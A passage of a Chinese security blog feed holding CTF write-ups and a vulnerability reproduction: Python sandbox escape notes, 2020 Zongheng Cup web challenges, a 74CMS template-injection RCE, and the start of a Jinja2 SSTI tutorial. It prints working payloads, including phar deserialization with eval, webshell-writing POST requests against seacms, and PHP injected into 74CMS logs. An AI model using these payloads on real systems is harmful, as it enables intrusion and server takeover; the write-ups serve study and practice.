urllib.urlopen(<span class="string">&#x27;file:///&#x27;</span>+__file__)</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">u = urllib.request.urlopen(<span class="string">&#x27;file:///&#x27;</span>+__file__)</span><br><span class="line">print(u.read())</span><br></pre></td></tr></table></figure><p>(5)fileinput模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">with</span> fileinput.input(files=(__file__,)) <span class="keyword">as</span> f:</span><br><span class="line">  <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    print(line)</span><br></pre></td></tr></table></figure><h2 id="0x05-内建模块">0x05 内建模块</h2><p>如果沙箱不让我们导入外部模块，或者是要导入的模块被禁用，那我们只能求助于Python的内部模块<code>__builtins__</code>( 即Python 本身默认已经导入模块中的函数)。</p><p>dir内置函数可以列出一个模块/类/对象下面所有的属性和函数，查看一下<code>__builtins__</code>中的函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102171409.png" alt=""></p><p>例如，我们可以引用<code>__import__ </code>来导入os，并执行命令：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102171530.png" alt=""></p><p>由于内置模块中的危险函数过多，比如eval,exec等，导致上文使用的沙箱对**<strong>***<em>builtins*</em></strong>****进行了处理，通过 del 关键字将里面的所有函数引用都删除了。</p><p>如果保留reload内置函数，我们还可以通过<code> reload( __builtins__)</code> 恢复，但是现在通过<code>__builtins__</code>来进行逃逸已经不现实了。</p><h2 id="0x06-对象创建与引用">0x06 对象创建与引用</h2><p>删除的是只是函数引用，而不是函数本身，如果你们熟悉C语言的话，函数引用可以理解为函数指针，既然<code>__builtins__</code>中的引用没了，那我们就需要从<strong>其他地方找到敏感函数的引用</strong>，从而实现逃逸。</p><p>关于这一块的内容，其实和flask SSTI的内容是一样的，也是通过python的内置类型的继承链来寻找更多的引用，以下字段是寻找继承链的关键：</p><table><thead><tr><th>名称</th><th>介绍</th></tr></thead><tbody><tr><td><code>__dict__</code></td><td>这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性</td></tr><tr><td><code>__class__</code></td><td>返回一个实例对应的类型</td></tr><tr><td><code>__base__</code></td><td>返回一个类所继承的基类</td></tr><tr><td><code>__subclasses__()</code></td><td>返回该类的所有子类</td></tr><tr><td><code>__mro__</code></td><td>python支持多重继承，在解析<code>__init__</code>时，定义解析顺序的是子类的<code>__mro__</code>属性（值是类的元组）</td></tr><tr><td><code>__slots__</code></td><td>限制类动态添加属性</td></tr><tr><td><code>__getattribute__()</code></td><td>获取属性或方法，对模块和类都有效</td></tr><tr><td><code>__getitem__()</code></td><td>以索引取值或者键取值</td></tr><tr><td><code>__globals__</code></td><td>返回函数所在模块命名空间中的所有变量</td></tr></tbody></table><p>其他的具体内容参考flask SSTI即可。</p><h2 id="0x07-Reference">0x07 Reference</h2><p><a href="https://blog.szfszf.top/article/15/">https://blog.szfszf.top/article/15/</a></p><p><a href="https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p><p><a href="https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg">https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Python沙箱逃逸&quot;&gt;Python沙箱逃逸&lt;/h1&gt;
&lt;p&gt;上一篇写到了关于python flask SSTI的总结文章，看了沙箱逃逸之后，发现这两者的方法和payload很相似，所以把python的沙箱逃逸和服务端模板注入放在一起总结。&lt;/p&gt;
&lt;h2 id=
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="沙箱逃逸" scheme="http://ca0y1h.top/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>纵横杯2020-Web-WriteUp</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp/</id>
    <published>2020-12-28T14:09:46.000Z</published>
    <updated>2020-12-28T14:11:09.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="纵横杯2020-Web-WriteUp">纵横杯2020 Web WriteUp</h1><p>题目源码：</p><p>链接: <a href="https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A">https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A</a>  密码: dmqt</p><h2 id="0x01-easycl">0x01 easycl</h2><p>打开题目直接进入登录界面，有admin用户存在，弱密码无效。根据Wappalyzer提示，题目站点使用了CodeIgniter框架，通过比对题目环境的URL和CodeIgniter的三个大版本的源码，猜测应该用的是CodeIgniter4.0。前台登录有盲注存在：      可以用SQLMAP跑出数据库信息，但是进入后台没有什么用。再使用SQLMAP获取sql-shell，可以读取部分文件：        <img src="https://uploader.shimo.im/f/yKNJ4TwZFR1VppPL.png!thumbnail" alt="img">      这道题坑的地方就在于网站根目录不在/var/www/下，通过读取 /etc/apache2/sites-enabled/000-default.conf得到网站根目录/var/sercet/html再用SQL拿到os-shell，搜索flag文件        <img src="https://uploader.shimo.im/f/YEqWl1M66valOfP6.png!thumbnail" alt="img">      读取flag文件        <img src="https://uploader.shimo.im/f/D4FIVx50ohQWkJ4c.png!thumbnail" alt="img"></p><h2 id="0x02-easycms">0x02 easycms</h2><p>www.zip 可以下载源码查看配置文件/common/config/config.php        <img src="https://uploader.shimo.im/f/kNIkXOn14JxnvHhs.png!thumbnail" alt="img">      用admin和admin868可以成功登陆网站后台。<a href="https://www.freebuf.com/vuls/248912.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%90%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AASSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E5%AF%B9%E6%AF%94%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%A2%98%E7%9B%AE%E6%8A%8A%E6%BC%8F%E6%B4%9E%E6%8D%A2%E6%88%90%E4%BA%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%EF%BC%9A/core/class/collection.class.php">https://www.freebuf.com/vuls/248912.html这篇文章中提到了一个SSRF漏洞，代码进行对比之后，发现题目把漏洞换成了任意文件读取，文件位置：/core/class/collection.class.php</a>        <img src="https://uploader.shimo.im/f/RSvH1VN5mYRXhU0i.png!thumbnail" alt="img"></p><p>然后打比赛的时候就一直卡在这，现在想想真的是蠢，忘了去看yzmcms的官方issues，我说怎么这么多人做出来了。</p><p>照着这个复现一下就可以打过去：<a href="https://github.com/yzmcms/yzmcms/issues/53">https://github.com/yzmcms/yzmcms/issues/53</a></p><p>找到了洞不知道怎么利用，真的是有够菜的，还是来看看原理。</p><p>当时最大的问题就是不能回显，当时我直接在网址配置中用file协议读文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153535.png" alt=""></p><p>提交之后，点击测试采集，在phpstorm打断点调试，在运行到100行的时候，content中的内容是/etc/passwd的文件内容。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153848.png" alt=""></p><p>但是在调用get_sub_content函数之后，content的值会被改变，我们跟进这个函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228154259.png" alt=""></p><p>这个函数用了两次explode函数把content分割成一个数组，然后返回一个冒号。既然这样，我们知道flag的格式是<code>flag&#123;&#125;</code>那么把<code>start</code>改成<code>f</code>，把<code>end</code>改成<code>&#125;</code>，再经过这个函数处理后就可以保留关键的地方：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201139.png" alt=""></p><p>但是问题又来了，content的内容还要经过get_all_url函数的处理，继续跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201349.png" alt=""></p><p>第65行preg_match_all函数提取a标签中的内容，并且在下面的foreach循环中，会接着提取href元素内容，既然如此，那么我们就把要读取的文件写在a标签的href元素中作为链接，然后封装在一个HTML文件中。</p><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;file:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure><p>模块采集配置：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204207.png" alt=""></p><p>跟进函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203235.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203432.png" alt=""></p><p>但是在第83行还要经过url_check函数的检查，跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203622.png" alt=""></p><p>这个函数内部规定了只允许HTTP或HTTPS协议，于是我们用file协议会直接报错。但这种检查前四个字符的方式未免有些简单粗暴，可以使用一个PHP特性绕过：</p><blockquote><p>When PHP encounters an unknown protocol, it will throw a warning and set the protocol to null. When the Protoco is null or file, the local operation will be carried out. By default, the local file operation will be performed if the protocol is not transferred or the protocol does not exist.</p></blockquote><p>简单来说就是：当PHP遇到一个不存在的协议的时候，会把协议置空，并且当协议为空或者不存在时，会当做文件操作，即file协议。</p><p>既然这样，那我们最后的payload就是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;httpxxx:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure><p>最后成功返回到content参数中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204406.png" alt=""></p><p>虽然有个warning，但是文件还是读出来了：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204838.png" alt=""></p><h2 id="0x03-hellophp">0x03 hellophp</h2><p>这题也挺简单的，时间都花在上面那道题目了，真的是亏死。。</p><p>重点审计class.php这个文件，应该可以很明显的发现有反序列化的漏洞：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228205833.png" alt=""></p><p>其中tile和comment都是可以控制的，那么利用其中一个变量即可。</p><p>接着需要寻找反序列化的触发点，全局搜索没有unserialize函数后，可以很快的发现admin.php有文件上传功能，那么肯定是要上传phar压缩包触发反序列化，再找文件操作的相关函数，在index.php中有file_exist函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228210143.png" alt=""></p><p>把phar压缩包的路径传入img参数即可触发反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line">    <span class="keyword">public</span> $comment;</span><br><span class="line">    <span class="keyword">public</span> $logo_url;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$title, $comment</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title = $title;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;comment = $comment;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$title = <span class="string">&quot;1&#x27;.eval(\$_POST[a]).&#x27;a&quot;</span>;</span><br><span class="line">$comment = <span class="number">456</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line"><span class="comment">//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$A = <span class="keyword">new</span> Config($title, $comment);</span><br><span class="line">$phar-&gt;setMetadata($A);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h2 id="0x04-大家一起来审代码">0x04 大家一起来审代码</h2><p>看到这种量级的代码，出题人一般都是拿别市面上的CMS，这个时候就可以先找配置文件看看，在data/common.inc.php文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228213535.png" alt=""></p><p>有两个信息：第一出题人用的是seacms，第二数据库的用户名和密码是admin,admin，这个也是本网站的后台密码。</p><p>既然是seacms，那我们就充分发挥Google的作用：<a href="https://lhlh22.github.io/2020/10/22/Seacms-v10-1-%E5%90%8E%E5%8F%B0getshell/#%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%89%EF%BC%89">https://lhlh22.github.io/2020/10/22/Seacms-v10-1-后台getshell/#后台命令执行（三）</a></p><p>这篇文章提到了admin_notify.php文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228214002.png" alt=""></p><p>过滤掉了括号和反引号，那么我们就可以直接<code>include &quot;/flag&quot;;</code>即可，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;adm1n&#x2F;admin_notify.php?action&#x3D;set</span><br><span class="line">POST: notify1&#x3D;&quot;;include &quot;&#x2F;flag&quot;;&#x2F;&#x2F;&amp;notify2&#x3D;2&amp;notify3&#x3D;3</span><br></pre></td></tr></table></figure><p>再访问<code>/data/admin/notify.php</code></p><p>除此之外，<code>adm1n/admin_ip.php</code>也可以写入webshell：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228215247.png" alt=""></p><p>不知道这个preg_match有啥用。。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: v&#x3D;&quot;;eval($_POST[1]);&#x2F;&#x2F;&amp;ip&#x3D;1.1.1.1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;纵横杯2020-Web-WriteUp&quot;&gt;纵横杯2020 Web WriteUp&lt;/h1&gt;
&lt;p&gt;题目源码：&lt;/p&gt;
&lt;p&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A&quot;&gt;https://
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>骑士CMS模板注入+文件包含getshell复现</title>
    <link href="http://ca0y1h.top/code_audit/PHP/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/code_audit/PHP/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-19T13:23:50.000Z</published>
    <updated>2020-12-19T13:24:50.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="骑士CMS模板注入-日志包含RCE复现">骑士CMS模板注入+日志包含RCE复现</h1><p>本文参考自TimeLine Sec团队成员microworld的复现记录。</p><h2 id="0x01-漏洞概述">0x01 漏洞概述</h2><p><a href="http://www.74cms.com/news/show-2497.html">http://www.74cms.com/news/show-2497.html</a></p><p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p><h2 id="0x02-影响版本">0x02 影响版本</h2><p>骑士 CMS &lt; 6.0.48</p><h2 id="0x03-环境搭建">0x03 环境搭建</h2><p>从官网下载6.0.20版本源代码</p><p><a href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p><p>新建数据库，用MAMP Pro搭建站点</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201214210511.png" alt=""></p><h2 id="0x04-漏洞复现">0x04 漏洞复现</h2><p>发送如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;</span><br><span class="line">1</span><br><span class="line">&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215153839.png" alt=""></p><ol start="2"><li>查看站点日志，文件位于<code>/data/Runtime/Logs/home/20_12_15.log</code></li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154016.png" alt=""></p><ol start="3"><li>包含日志</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154208.png" alt=""></p><h2 id="0x05-漏洞分析">0x05 漏洞分析</h2><p>在正式分析漏洞之前，先看一看74CMS的路由和日志记录。</p><p>由于74CMS是基于ThinkPHP 3.2.3，其标准的URL路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作</span><br></pre></td></tr></table></figure><p>但是74CMS采用的是普通模式，使用传统的GET传参来指定当前访问的模块、控制器和方法，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;?m&#x3D;模块&amp;c&#x3D;控制器&amp;a&#x3D;方法&amp;var&#x3D;参数</span><br></pre></td></tr></table></figure><p>当然这些参数也是可以自定义的，配置文件位于<code>ThinkPHP/Conf/convention.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154751.png" alt=""></p><p>其次，ThinkPHP定义了日志记录的方式，在<code>ThinkPHP/Library/Think/Log.class.php</code>中的write方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215155115.png" alt=""></p><p>ERR代表一般性错误，<code>$destination</code>是日志的存储位置，日志文件名是有<code>年_月_日</code>组成。</p><p>根据官方通告，漏洞代码位于<code>Application/Common/Controller/BaseController.class.php</code>的<code>assign_resume_tpl</code>方法，用于渲染简历模板：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160033.png" alt=""></p><p>继续跟进fetch函数，该函数位于<code>Controllor.class.php</code>文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160208.png" alt=""></p><p>函数内部又调用了<code>ThinkPHP/Lirary/Think/View.class.php</code>类中的<code>fetch</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160728.png" alt=""></p><p><code>content</code>为空进入第一个if判断，模板文件不存在的话直接返回，下一个if语句判断<code>TMPL_ENGINE_TYPE</code>是否是<code>php</code>，我们可以全局搜索这个常量，在<code>ThinkPHP/Conf/convention.php</code>中定义为<code>Think</code>，也就是说使用Think模板，那么就进入到else语句中。</p><p>首先构造一个参数数组<code>$params</code>，然后将调用静态方法<code>Hook::listen</code>，继续跟进，位于<code>ThinkPHP/Library/Hook.class.php</code>文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215161649.png" alt=""></p><p>此时<code>tag=view_parse</code>，该方法会查找<code>$tags</code>中有没有绑定<code>view_parse</code>事件的方法，然后用foreach遍历<code>$tags</code>属性，并执行<code>Hook:exec</code>方法。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215172131.png" alt=""></p><p>此方法会检查行为名称中是否存在<code>Behavior</code>，若存在此关键字，行为扩展必须使用run入口方法，关于Hook的配置在<code>/ThinkPHP/Mode/common.php</code>中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184343.png" alt=""></p><p>继续跟进到<code>ThinkPHP/Behavior/ParseTemplateBehavior.class.php</code>，找到文件中的run方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184717.png" alt=""></p><p>已知74CMS采用的是Think模板引擎，当首次运行时不存在缓存文件，会进入到else语句中，新建一个Template类，在调用类中的fetch方法，位于<code>ThinkPHP/Library/Think/Template.class.php</code>文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185208.png" alt=""></p><p>调用<code>loadTemplate()</code>，将其存入<code>templateCacheFile</code>中，我们跟入<code>loadTemplate</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185930.png" alt=""></p><p>首先读取templateFile的文件内容存到tmplContent中，然后再调用compiler函数编译模板内容，继续跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215190136.png" alt=""></p><p>传入的模板内容未经过过滤就直接被拼接到<code>$tmplContent</code>变量，然后返回<code>loadTemplate</code>方法，调用<code>put</code>方法写入缓存文件，并返回缓存文件名，于是我们再回归到<code>fetch()</code>方法，调用了<code>Storage::load</code>，位于<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215191004.png" alt=""></p><p>这里就直接包含文件，最终造成了模板注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;骑士CMS模板注入-日志包含RCE复现&quot;&gt;骑士CMS模板注入+日志包含RCE复现&lt;/h1&gt;
&lt;p&gt;本文参考自TimeLine Sec团队成员microworld的复现记录。&lt;/p&gt;
&lt;h2 id=&quot;0x01-漏洞概述&quot;&gt;0x01 漏洞概述&lt;/h2&gt;
&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>jinja_SSTI_Bypass</title>
    <link href="http://ca0y1h.top/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass/"/>
    <id>http://ca0y1h.top/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass/</id>
    <published>2020-12-19T13:23:14.000Z</published>
    <updated>2020-12-19T13:51:50.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jinja2-SSTI-Bypass">jinja2 SSTI &amp; Bypass</h1><p>本文主要针对jinja2的SSTI做一些讲解和说明。</p><h2 id="常用的内建属性">常用的内建属性</h2><h3 id="class"><code>__class__</code></h3><p>用于返回对象所属的类，和<code>type()</code>相同：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="base"><code>__base__</code></h3><p>以字符串的形式返回一个类所继承的类，一般情况下是object</p><h3 id="bases"><code>__bases__</code></h3><p>以元组的形式返回一个类所继承的类</p><h3 id="mro"><code>__mro__</code></h3><p>返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Father</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">GrandFather</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">son</span>(<span class="params">Father,GrandFather</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(son.__base__)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Father</span>&#x27;&gt;</span></span><br><span class="line"><span 